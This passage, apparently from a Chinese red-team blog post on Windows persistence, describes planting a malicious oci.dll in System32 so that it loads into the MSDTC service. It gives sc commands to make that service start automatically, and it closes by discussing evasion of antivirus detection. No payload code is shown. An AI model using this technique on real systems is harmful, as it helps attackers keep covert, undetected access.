该服务启动后会尝试从System32加载三个DLL文件：oci.dll、SQLLib80.dll、xa80.dll。服务项如下：

[![](_v_images/20200812113152007_21604.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143130-f7c11a18-d552-1.jpeg)

对应注册表如下：

[![](_v_images/20200812113151197_26556.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143139-fcd65356-d552-1.jpeg)

在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。  
默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：

```
sc qc msdtc
sc config msdtc start= auto
```

恶意dll会被加载到msdtc.exe进程中执行，隐蔽性强：

[![](_v_images/20200812113150282_18522.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143233-1d290694-d553-1.jpeg)

## 0x0B 总结

一开始整理持久化技术的时候总共列了20种左右，但实践中发现很多持久化技术并是不通用的，例如针对特定场景，特定配置，特定应用的权限维持；甚至还有些是“被动”持久化，例如快捷方式的替换，排除利用快捷方式漏洞利用这条路，如果目标不去点是不会触发的。因此将那些局限性较大的持久化技术删掉以精简篇幅（减少工作量），最后将持久化技术精简到了以上10种，相对来说比较通用。  
整理的过程中也发现一个Ring3中无奈的点：用户层的持久化如果想做到隐蔽性强且绕过杀软的行为检测，一定要借助Windows自带的功能（白利用），如果这些功能或模块在特殊环境中被关闭、卸载或无法正常启动就会很尴尬。因此多准备几种方法总还是很有用的。  
由于时间关系，部分需要单独制作的DLL使用了msf直接生成的DLL进行测试，但免杀效果堪忧。后续制作CS插件的时候还需要再完成这些DLL并对其做一些免杀处理。
